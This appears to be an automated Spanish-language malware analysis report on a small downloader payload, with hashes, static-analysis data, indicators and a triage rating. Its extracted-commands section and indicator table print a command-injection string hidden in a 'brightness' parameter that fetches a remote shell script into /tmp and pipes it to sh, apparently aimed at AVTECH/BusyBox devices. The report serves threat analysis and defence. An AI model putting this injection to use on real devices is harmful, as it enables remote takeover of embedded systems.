# 🧬 Payload Analysis

`6dafd56550494503b47bb019d4e7a0e38a5c8b4d936c8cc8efbff370328b4687`

## 📌 Resumen

Texto ASCII de 359 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s avtech2`
3. `busybox wget hxxp://91.92.40.XXX` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/6dafd56550494503b47bb019d4e7a0e38a5c8b4d936c8cc8efbff370328b4687.md](../../../../../malware-like/oraculo/downloader/6dafd56550494503b47bb019d4e7a0e38a5c8b4d936c8cc8efbff370328b4687.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6dafd56550494503b47bb019d4e7a0e38a5c8b4d936c8cc8efbff370328b4687`
- **SHA1:** `04c7e786e1c543739163bc74eb60a03ea763b226`
- **MD5:** `fd625c7ac4b5abab247b69a114c87ca8`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 359 B |
| Entropía | 5.21 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
action=white_led&brightness=$(cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s avtech2;busybox wget hxxp://91.92.40.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | action=white_led&brightness=$(cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s avtech2;busybox wget hxxp://91.92.40.XXX | strings |
| hash | 6dafd56550494503b47bb019d4e7a0e38a5c8b4d936c8cc8efbff370328b4687 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
